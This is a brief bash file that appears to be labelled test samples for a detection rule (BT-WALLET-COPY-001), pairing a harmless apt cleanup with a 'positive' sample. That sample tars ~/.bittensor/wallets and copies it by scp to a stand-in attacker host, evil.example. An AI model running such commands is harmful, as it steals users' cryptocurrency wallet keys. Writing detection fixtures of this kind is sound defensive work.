#!/bin/bash
# Negative line: a normal, harmless cleanup.
rm -rf /var/lib/apt/lists/*

# Positive: archives the wallet directory and ships it to a remote host.
# BT-WALLET-COPY-001 (tar of ~/.bittensor)
tar czf /tmp/w.tgz ~/.bittensor/wallets
scp /tmp/w.tgz attacker@evil.example:/loot/
